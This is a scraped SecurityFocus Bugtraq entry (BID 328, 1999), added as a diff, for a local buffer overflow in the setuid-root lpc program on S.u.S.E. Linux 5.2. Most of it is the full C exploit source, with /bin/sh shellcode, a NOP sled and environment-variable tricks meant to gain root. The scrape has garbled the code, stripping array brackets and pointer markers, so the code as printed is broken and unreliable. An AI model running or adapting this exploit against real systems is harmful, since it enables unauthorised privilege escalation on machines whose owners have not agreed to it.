@@ -1,0 +1,100 @@
+#SpeeDr00t@Black Falcon<br>#bid328<p><b><span style="font-size: 18pt;">S.u.S.E. 5.2 lpc Vulnerabilty</span></b></p><br><br><a href="http://www.securityfocus.com/bid/328/info">info</a><br><a href="http://www.securityfocus.com/bid/328/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/328/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/328/solution">solution</a><br><a href="http://www.securityfocus.com/bid/328/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				328
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Feb 03 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Feb 03 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				First posted to BugTraq by xnec &lt;xnec@INFERNO.TUSCULUM.EDU&gt; on Feb 3, 1999.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					S.u.S.E. Linux 5.2 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					S.u.S.E. Linux 5.1 <br/>
+					
+				
+					S.u.S.E. Linux 5.0 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	 /*<br/><br/> Standard overflow for x86 linux lpc. PLP Line Printer Control program, version 4.0.3. Tested on SuSE 5.2 (suidroot). Test your copy of /usr/bin/lpc by trying an /usr/bin/lpc attach lp `perl -e "print 'A' x 1000"`;lpc status lp The problematic code is in displayq.c and control_ops.c, where we attempt to fscanf() the lockfile's contents into a fixed length buffer. See the Bugtraq post for full fix information(www.geek-girl.com/bugtraq).<br/><br/> The buffer we're overflowing is 256bytes, and an offset of 0 works just fine. Try in increments of +-100 if it doesn't work for you.<br/><br/> Obviously this is a complete rip of Aleph1's standard overflow program from his paper "smashing the stack for fun and profit".<br/><br/> to compile: gcc -o xnec_lpc xnec_lpc.c<br/><br/> bugs: only sets uid=0, and you may have to have a printer defined (lp on my box).<br/><br/> greets to #sk1llz<br/><br/> -xnec xnec on EF and DALnet, xnec@inferno.tusculum.edu<br/><br/> */ #include &lt;stdlib.h&gt;<br/><br/> #define DEFAULT_OFFSET 0<br/><br/> #define DEFAULT_BUFFER_SIZE 356<br/><br/> #define DEFAULT_EGG_SIZE 2048<br/><br/> #define NOP 0x90<br/><br/> char pause;<br/><br/> char shellcode =<br/><br/> "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<br/><br/> "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<br/><br/> "\x80\xe8\xdc\xff\xff\xff/bin/sh";<br/><br/> unsigned long get_esp(void) {<br/><br/> __asm__("movl %esp,%eax");<br/><br/> }<br/><br/> void main(int argc, char *argv) {<br/><br/> char *buff, *ptr, *egg;<br/><br/> long *addr_ptr, addr;<br/><br/> int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;<br/><br/> int i, eggsize=DEFAULT_EGG_SIZE;<br/><br/> if (argc &gt; 1) bsize = atoi(argv1);<br/><br/> if (argc &gt; 2) offset = atoi(argv2);<br/><br/> if (argc &gt; 3) eggsize = atoi(argv3);<br/><br/> if (!(buff = malloc(bsize))) {<br/><br/> printf("Can't allocate memory.\n");<br/><br/> exit(0);<br/><br/> }<br/><br/> if (!(egg = malloc(eggsize))) {<br/><br/> printf("Can't allocate memory.\n");<br/><br/> exit(0);<br/><br/> }<br/><br/> addr = get_esp() - offset;<br/><br/> printf("Using address: 0x%x\n", addr);<br/><br/> printf("\nPLP Line Printer Control program, version 4.0.3 overflow.\n");<br/><br/> printf("Bug found by xnec, code ripped from Aleph1. After running this program, simply compile and run:\n---\n<br/><br/> #include &lt;unistd.h&gt;<br/><br/> void main(){system(\"/bin/bash\");}\n---\n");<br/><br/> scanf("%c", pause);<br/><br/> ptr = buff;<br/><br/> addr_ptr = (long *) ptr;<br/><br/> for (i = 0; i &lt; bsize; i+=4)<br/><br/> *(addr_ptr++) = addr;<br/><br/> ptr = egg;<br/><br/> for (i = 0; i &lt; eggsize - strlen(shellcode) - 1; i++)<br/><br/> *(ptr++) = NOP;<br/><br/> for (i = 0; i &lt; strlen(shellcode); i++)<br/><br/> *(ptr++) = shellcodei;<br/><br/> buffbsize - 1 = '\0';<br/><br/> eggeggsize - 1 = '\0';<br/><br/> memcpy(egg,"EGG=",4);<br/><br/> putenv(egg);<br/><br/> memcpy(buff,"RET=",4);<br/><br/> putenv(buff);<br/><br/> system("`which lpc` attach lp $RET; `which lpc` status lp");<br/><br/> }
+	
+		<ul>
+</ul>
+</div>
